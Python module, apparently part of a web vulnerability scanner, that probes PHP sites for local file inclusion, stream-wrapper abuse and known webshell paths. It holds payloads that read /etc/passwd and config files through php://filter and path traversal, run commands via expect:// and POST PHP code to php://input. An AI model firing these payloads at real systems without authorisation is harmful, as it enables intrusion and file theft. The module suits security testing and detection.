"""PHP-focused LFI / wrapper / webshell indicator checks."""
from __future__ import annotations

from typing import Dict, List, Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from utils.logger import get_logger

logger = get_logger(__name__)

_PHP_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "phar://test.phar/test.txt",
    "/proc/self/environ",
    "....//....//....//etc/passwd",
    "php://filter/convert.base64-encode/resource=../config.php",
    "php://filter/convert.base64-encode/resource=../../../../../../etc/passwd",
]

_INDICATORS = [
    "root:x:0:0",
    "PD9waHA",  # <?php base64
    "<?php",
    "phpinfo()",
    "allow_url_include",
    "DOCUMENT_ROOT",
    "PATH=",
    "HTTP_USER_AGENT",
]


class PHPWebshellLFITester:
    def __init__(self, http_client, config: Dict):
        self.http_client = http_client
        self.config = config or {}
        self.cfg = self.config.get("php_webshell") or {}

    def scan(self, url: str, context: Optional[Dict] = None) -> List[Dict]:
        context = context or {}
        # prefer PHP-looking targets
        headers = context.get("headers") or {}
        powered = str(headers.get("x-powered-by") or headers.get("X-Powered-By") or "")
        body = ""
        if context.get("response") is not None:
            body = getattr(context["response"], "text", "") or ""
        phpish = (
            ".php" in url.lower()
            or "php" in powered.lower()
            or "wordpress" in body.lower()
            or "wp-content" in body.lower()
            or self.cfg.get("force", False)
        )
        if not phpish and "?" not in url:
            return []

        vulns: List[Dict] = []
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        params = list(qs.keys()) or ["file", "page", "include", "path", "template", "lang"]

        for param in params[:4]:
            for payload in _PHP_PAYLOADS:
                try:
                    if qs:
                        qs2 = {k: list(v) for k, v in qs.items()}
                        qs2[param] = [payload]
                        test = urlunparse(parsed._replace(query=urlencode(qs2, doseq=True)))
                    else:
                        test = urlunparse(
                            parsed._replace(query=urlencode({param: payload}))
                        )
                    headers_req = {}
                    if payload == "php://input":
                        resp = self.http_client.post(
                            test,
                            data=b"<?php echo 'DEEPEYE_PHP_RCE'; ?>",
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                        )
                    else:
                        resp = self.http_client.get(test, headers=headers_req or None)
                    if not resp:
                        continue
                    text = getattr(resp, "text", "") or ""
                    for ind in _INDICATORS:
                        if ind in text:
                            sev = "critical" if "php" in payload or "expect" in payload else "high"
                            vulns.append({
                                "type": "PHP LFI / Wrapper Abuse",
                                "severity": sev,
                                "url": url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Indicator '{ind}' in response",
                                "description": "PHP stream wrappers or LFI patterns disclose source/files",
                                "remediation": "Disable allow_url_include; block php:// wrappers; whitelist includes",
                            })
                            return vulns
                except Exception as e:
                    logger.debug(f"php lfi: {e}")

        # common webshell paths
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in ("/shell.php", "/c99.php", "/r57.php", "/cmd.php", "/upload/shell.php", "/wso.php"):
            try:
                resp = self.http_client.get(base + path)
                if not resp:
                    continue
                st = getattr(resp, "status_code", 0)
                text = (getattr(resp, "text", "") or "").lower()
                if st == 200 and any(x in text for x in ("passwd", "eval(", "webshell", "c99", "wso", "cmd")):
                    vulns.append({
                        "type": "Possible PHP Webshell Path",
                        "severity": "critical",
                        "url": base + path,
                        "parameter": "path",
                        "payload": path,
                        "evidence": f"HTTP {st}; suspicious content markers",
                        "description": "Known webshell path returns suspicious content",
                        "remediation": "Remove webshells; scan uploads; restrict execute on upload dirs",
                    })
            except Exception:
                pass
        return vulns
